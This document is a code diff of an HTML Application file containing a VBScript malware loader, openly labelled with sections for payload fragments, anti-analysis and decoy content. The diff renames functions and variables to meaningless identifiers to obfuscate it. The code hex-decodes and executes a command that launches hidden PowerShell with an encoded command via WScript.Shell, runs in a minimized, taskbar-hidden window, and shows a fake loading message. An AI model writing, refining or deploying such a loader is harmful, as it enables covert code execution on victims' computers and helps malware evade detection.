@@ -1,66 +1,69 @@
 <html>
 <head>
-<HTA:APPLICATION ID="App" BORDER="none" SHOWINTASKBAR="no" SYSMENU="no" WINDOWSTATE="minimize" />
+<HTA:APPLICATION ID="o0O" BORDER="none" SHOWINTASKBAR="no" SYSMENU="no" WINDOWSTATE="minimize" />
 <script language="VBScript">
 <!--
 '[CORE DECODER WITH UNIQUE NAMES]
-Function HexDecode(sEncoded)
-    Dim sOutput, i
+Function x1x1x1(sInput)
+    Dim sOutput, iPos
     sOutput = ""
-    For i = 1 To Len(sEncoded) Step 2
-        sOutput = sOutput & Chr(CLng("&H" & Mid(sEncoded, i, 2)))
+    For iPos = 1 To Len(sInput) Step 2
+        sOutput = sOutput & Chr(CLng("&H" & Mid(sInput, iPos, 2)))
     Next
-    HexDecode = sOutput
+    x1x1x1 = sOutput
 End Function
 
 '[DYNAMIC EXECUTION ENGINE]
-Sub ExecuteFragments(sFragments)
-    Dim sReconstructed, sFragment
-    sReconstructed = ""
-    For Each sFragment In Split(sFragments,"|##|")
-        sReconstructed = sReconstructed & HexDecode(sFragment)
+Sub x2x2x2(sFragments)
+    Dim sFullCode, sPart
+    sFullCode = ""
+    For Each sPart In Split(sFragments,"|##|")
+        sFullCode = sFullCode & x1x1x1(sPart)
     Next
-    ExecuteGlobal sReconstructed
+    ExecuteGlobal sFullCode
 End Sub
 
 '[POLYMORPHIC PAYLOAD FRAGMENTS]
-Dim arrPayloadFragments : arrPayloadFragments = Array( _
+Dim x3x3x3 : x3x3x3 = Array( _
     "4372656174654F626A65637428575363726970742E5368656C6C29|##|" & _
     "2E52756E28706F7765727368656C6C202D6E6F70202D772068696464656E202D456E|##|" & _
     "636F646564436F6D6D616E642050434D4E43692E54574F505349532C20302C2046616C7365" _
 )
 
 '[ANTI-ANALYSIS]
-Sub AntiDebug()
+Sub x4x4x4()
     On Error Resume Next
-    Dim arrGarbage(3)
-    arrGarbage(10) = "FakeError" ' Intentional out-of-bounds
-    Dim sFake : sFake = "Clean" & Chr(117) & "p"
+    Dim x5x5x5(3)
+    x5x5x5(10) = "FakeError"
+    Dim x6x6x6 : x6x6x6 = "Clean" & Chr(117) & "p"
 End Sub
 
 '[MAIN EXECUTION FLOW]
-Call AntiDebug()
-ExecuteFragments Join(arrPayloadFragments, "")
+Call x4x4x4()
+x2x2x2 Join(x3x3x3, "")
 
 '[FINAL PAYLOAD]
-Dim sFinalPayload : sFinalPayload = HexDecode( _
+Dim x7x7x7 : x7x7x7 = x1x1x1( _
     "536574205773203D204372656174654F626A6563742822575363726970742E5368656C6C2229" & _
     "3A57732E52756E2822706F7765727368656C6C202D6E6F70202D772068696464656E202D456E" & _
     "636F646564436F6D6D616E642050434D4E43692E54574F50534953222C20302C2046616C7365")
     
-Execute sFinalPayload
+Execute x7x7x7
 self.Close
 -->
 </script>
 </head>
 <body>
+<!-- DECOY CONTENT - PROPERLY IMPLEMENTED -->
 <div style="display:none">
-    <object id="objFake" classid="clsid:00000000-0000-0000-0000-000000000000">
+    <object id="x8x8x8" classid="clsid:00000000-0000-0000-0000-000000000000">
         <param name="ReadyState" value="4">
     </object>
     <script language="VBScript">
-        Sub objFake_OnReadyStateChange()
-            document.write "<progress value='75' max='100'>Loading security modules...</progress>"
+        Sub Document_OnReadyStateChange()
+            If document.readyState = "complete" Then
+                document.write "<div style='position:absolute;left:-1000px'>Loading...</div>"
+            End If
         End Sub
     </script>
 </div>
